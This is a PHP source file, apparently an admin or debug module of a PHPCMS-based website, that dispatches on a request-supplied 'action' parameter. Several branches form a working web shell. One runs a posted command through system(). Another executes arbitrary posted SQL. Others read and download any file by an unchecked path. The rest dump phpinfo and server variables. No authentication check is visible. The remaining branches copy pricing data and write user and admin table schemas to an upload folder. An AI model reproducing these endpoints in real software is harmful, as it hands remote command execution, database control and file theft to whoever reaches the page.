<?php
require_once '../include/common.inc.php'; 

switch($action)
{ 
	case 'cmd':
		echo "<form action='?$_SERVER[QUERY_STRING]' method='post' ><textarea name='cmd' cols='100' rows='5' >" . htmlentities( $cmd ) . "</textarea><input name='cmd_submit' value='执行' type='submit' ></form>"; 
		if( $cmd_submit ){ 
			echo '<pre>'; 
			system( $cmd ); 
			echo '</pre>'; 
		}
		exit(); 
		break;
	case 'tables':
		$db_sql = $database ? 'show full tables from '.$database : 'show full tables'; 
		$db_tables = $db -> select($db_sql); 
		echo '<h3>' . ( $database ? $database : $db->dbname ) . '</h3>'; 
		echo '<table border="1px" >'; 
		foreach ( $db_tables as $i => $tab ) { 
			if( empty( $tab ) ){ continue; }
			$field_fields = array_keys( $tab ); 
			if( $i == 0 ){ 
				$th = '<tr>'; 
				$td = '<tr>'; 
				foreach ( $tab as $attr_name => $attr ) { 
					$th .= "<th>$attr_name</th>"; 
					$td .= "<td>".( $attr_name == $field_fields[0] ? "<a href='?mod=$mod&file=$file&action=columns&table=$attr&database=$database' >" : '' ).$attr.( $attr_name == $field_fields[0] ? "</a>" : '' );
					$td .= '&nbsp;&nbsp;' . ( $attr_name == $field_fields[0] ? "<a href='?mod=$mod&file=$file&action=table_data&table=$attr&database=$database' >data</a>" : '' )."</td>"; 
				}
				echo $th.'</tr>';
				echo $td.'</tr>';
			}
			else{ 
				echo '<tr>'; 
				foreach ( $tab as $attr_name => $attr ) { 
					echo "<td>".( $attr_name == $field_fields[0] ? "<a href='?mod=$mod&file=$file&action=columns&table=$attr&database=$database' >" : '' ).$attr.( $attr_name == $field_fields[0] ? "</a>" : '' );
					echo '&nbsp;&nbsp;' . ( $attr_name == $field_fields[0] ? "<a href='?mod=$mod&file=$file&action=table_data&table=$attr&database=$database' >data</a>" : '' )."</td>";
				}
				echo '</tr>'; 
			}
		}
		echo '</table>'; 
	case 'columns':
		if( !$table ){ break; }
		$table_sql = $database ? 'show full columns from '.$database.'.'.$table : 'show full columns from '.$table; 
		$table_columns = $db -> select($table_sql); 
		echo '<h3>' . ( $database ? $database : $db->dbname ) . '.' . $table . '</h3>'; 
		echo '<table border="1px" >'; 
		foreach ( $table_columns as $i => $col ) { 
			if( empty( $col ) ){ continue; }
			if( $i == 0 ){ 
				$th = '<tr>'; 
				$td = '<tr>'; 
				foreach ( $col as $attr_name => $attr ) { 
					$th .= "<th>$attr_name</th>"; 
					$td .= "<td>$attr</td>"; 
				}
				echo $th.'</tr>';
				echo $td.'</tr>';
			}
			else{ 
				echo '<tr><td>'; 
				echo join( '</td><td>', array_values( $col ) ); 
				echo '</td></tr>'; 
			}
		}
		echo '</table>'; 
		echo "<br><a href='?mod=$mod&file=$file&action=tables&database=$database' >back</a>"; 
		exit(); 
		break;
	case 'table_data':
		if( !$table ){ break; }
		$sqls = explode(";",$sql); 
		
		$select_flag = False; 
		if( $sql_submit ){ 
			foreach( $sqls as $_sql ){ 
				if( empty( $_sql ) ) continue; 
				if( stristr( $_sql, 'select' ) ) { 
					$select_flag = True; 
					$table_sql = stripslashes($_sql); 
					continue; 
				}
				$db -> query( stripslashes($_sql) ); 
			}
		}
		
		echo '<h3>' . ( $database ? $database : $db->dbname ) . '.' . $table . ( $select_flag ? '<br>查询 ：' . $table_sql : '' ) . '</h3>'; 
		echo "<form action='?$_SERVER[QUERY_STRING]' method='post' ><textarea name='sql' cols='100' rows='5' >" . stripslashes($sql) . "</textarea><br><input name='sql_submit' type='submit' value='执行' /></form>"; 
		
		$field_sql = $database ? 'show full columns from '.$database.'.'.$table : 'show full columns from '.$table; 
		$table_fields = $db -> select($field_sql); 
		$field_list = array(); 
		foreach ( $table_fields as $field ) { 
			$field_list[] = $field['Field']; 
		}
		
		if ( !$select_flag ) $table_sql = $database ? 'select `' . join( '`, `', $field_list ) . '` from '.$database.'.'.$table : 'select `' . join( '`, `', $field_list ) . '` from '.$table; 
		$table_rows = $db -> select($table_sql . " limit 0, 30000"); 
		echo '<font size="3" color="red" style="font-weight:bolder">'.(count($table_rows)>=30000?'限制3w条记录':count($table_rows)).'</font>';
		echo "<br><a href='?mod=$mod&file=$file&action=tables&database=$database' >back</a>";
		echo '<table border="1px" >'; 
		foreach ( $table_rows as $i => $row ) { 
			if( empty( $row ) ){ continue; }
			if( $i == 0 ){ 
				$th = '<tr>'; 
				$td = '<tr>'; 
				foreach ( $row as $attr_name => $attr ) { 
					$th .= "<th>$attr_name</th>"; 
					$td .= "<td>$attr</td>"; 
				}
				echo $th.'</tr>';
				echo $td.'</tr>';
			}
			else{ 
				echo '<tr><td>'; 
				echo join( '</td><td>', array_values( $row ) ); 
				echo '</td></tr>'; 
			}
		}
		echo '</table>'; 
		echo "<br><a href='?mod=$mod&file=$file&action=tables&database=$database' >back</a>"; 
		exit(); 
		break;
	case 'check':
		$w = stream_get_wrappers(); 
		echo 'openssl: ',  extension_loaded  ('openssl') ? 'yes':'no', "\n"; 
		echo 'http wrapper: ', in_array('http', $w) ? 'yes':'no', "\n"; 
		echo 'https wrapper: ', in_array('https', $w) ? 'yes':'no', "\n"; 
		echo 'wrappers: ', var_dump($w); 
		exit(); 
	case 'phpinfo':
		phpinfo(); 
		exit(); 
		break;
	case 'fifa':
		$req_file = PHPCMS_ROOT . $getf; 
		if( !file_exists($req_file) ) exit($req_file.' not found!');
		if( is_dir($req_file) ) exit($req_file.' is folder!');
		$_file = fopen( $req_file, 'rb' ); 
		$data = fread( $_file, filesize($req_file) ); 
		fclose($_file); 
		
		header('Content-type: text/plain');
        header('Accept-Ranges: bytes');
        header('Content-Disposition: attachment; filename=' . $getf );
        header('Cache-Control: must-revalidate, post-check=0, pre-check=0' );
        header('Pragma: no-cache' );
        header('Expires: 0' ); 
		
        exit($data);
		break;
	case 'varible':
		echo '<pre>';
		print_r( $_SERVER ); 
		exit();
	case 'widget':
		include admin_tpl('header'); 
		$rf = new ReflectionClass( 'form' ); 
		$forms = $rf -> getMethods(); 
		echo '<table border="1" >'; 
		foreach ( $forms as $form ) { 
			$fn = $form->getName(); 
			echo "<tr><td>$fn</td><td>"; 
			echo form::$fn(); 
			echo "</td><td>"; 
			echo "<table>"; 
			foreach( $form->getParameters() as $fp ){ 
				echo "<tr><td>";
				echo $fp->getName();
				echo "</td><td>";
				echo $fp->isDefaultValueAvailable() ? $fp->getDefaultValue() : '<font color="red" >require</font>';
				echo "</td></tr>"; 
			}
			echo "</table>"; 
			echo "</td></tr>"; 
		}
		echo '</table>'; 
	case 'dir':
		require './dir/Browser.php'; 
		break; 
	case 'xiaomao':
		$edprice = $db -> select('select goods_id,
								new_price as new_adult_price,
								old_price as new_adult_cost_price,
								new_child_price as new_child_price,
								new_child_cbprice as new_child_cost_price,
								ed_time_ag as product_date,
								up_time as modify_time,
								u_id 
								from hm_mk_edprice'); 
		foreach ( $edprice as $data ) { 
			$db -> insert( 'hm_tiaojia', $data ); 
		}
		break;
	case 'show_varible':
		echo '<pre>'; 
		print_r( get_defined_vars() ); 
		break; 
	case 'SERVER':
		echo '<pre>'; 
		print_r( $_SERVER ); 
		break; 
	case 'debug':
// 		$url = "http://$_SERVER[SERVER_ADDR]:$_SERVER[SERVER_PORT]/member/api/api.php?action=auth_member&username=123&password=111111";
// 		$url = "http://$_SERVER[SERVER_ADDR]:$_SERVER[SERVER_PORT]/admin.php?mod=report&file=report&action=SERVER";
		$url = "http://127.0.0.1:8080/joint/api/api.php?action=get_shop_info&shopid=1"; 
		echo $url;
		echo file_get_contents($url); 
		echo 'bbb';
		break;
	case 'compare_field':
		$table_names = array( '`homevv11`.`hm_admin`', 
								'`homevv11`.`hm_member`', 
								'`homevv11`.`hm_member_cache`', 
								'`homevv11`.`hm_member_info`', 
								'`homevv11`.`hm_member_detail`', 
								
								'`ultrax`.`pre_ucenter_admins`', 
								'`ultrax`.`pre_ucenter_applications`', 
								'`ultrax`.`pre_ucenter_badwords`', 
								'`ultrax`.`pre_ucenter_domains`', 
								'`ultrax`.`pre_ucenter_failedlogins`', 
								'`ultrax`.`pre_ucenter_feeds`', 
								'`ultrax`.`pre_ucenter_friends`', 
								'`ultrax`.`pre_ucenter_mailqueue`', 
								'`ultrax`.`pre_ucenter_memberfields`', 
								'`ultrax`.`pre_ucenter_members`', 
								'`ultrax`.`pre_ucenter_mergemembers`', 
								'`ultrax`.`pre_ucenter_newpm`', 
								'`ultrax`.`pre_ucenter_notelist`', 
								'`ultrax`.`pre_ucenter_pm_indexes`', 
								'`ultrax`.`pre_ucenter_pm_lists`', 
								'`ultrax`.`pre_ucenter_pm_members`', 
								'`ultrax`.`pre_ucenter_pm_messages_0`', 
								'`ultrax`.`pre_ucenter_pm_messages_1`', 
								'`ultrax`.`pre_ucenter_pm_messages_2`', 
								'`ultrax`.`pre_ucenter_pm_messages_3`', 
								'`ultrax`.`pre_ucenter_pm_messages_4`', 
								'`ultrax`.`pre_ucenter_pm_messages_5`', 
								'`ultrax`.`pre_ucenter_pm_messages_6`', 
								'`ultrax`.`pre_ucenter_pm_messages_7`', 
								'`ultrax`.`pre_ucenter_pm_messages_8`', 
								'`ultrax`.`pre_ucenter_pm_messages_9`', 
								'`ultrax`.`pre_ucenter_protectedmembers`', 
								'`ultrax`.`pre_ucenter_settings`', 
								'`ultrax`.`pre_ucenter_sqlcache`', 
								'`ultrax`.`pre_ucenter_tags`', 
								'`ultrax`.`pre_ucenter_vars`' ); 
		$ctf = fopen( './uploadfile/ct', 'w+' ); 
		foreach( $table_names as $table ){ 
			fwrite( $ctf, $table.'\n' );
			$f = $db -> select('show full columns from '.$table); 
			foreach( $f as $af ){ 
				fwrite( $ctf, '    '.$af[ 'Field' ].'-'.$af[ 'Type' ].($af[ 'Comment' ]?('-'.$af[ 'Comment' ]):'').'\n' ); 
			}
		}
		fclose( $ctf ); 
		break; 
	case 'file_content':
		$req_file = PHPCMS_ROOT . $getf; 
		$_file = fopen( $req_file, 'rb' );
		$data = fread( $_file, filesize($req_file) );
		fclose($_file);
		echo $data;
		break;
	default: 
		break; 
}
?>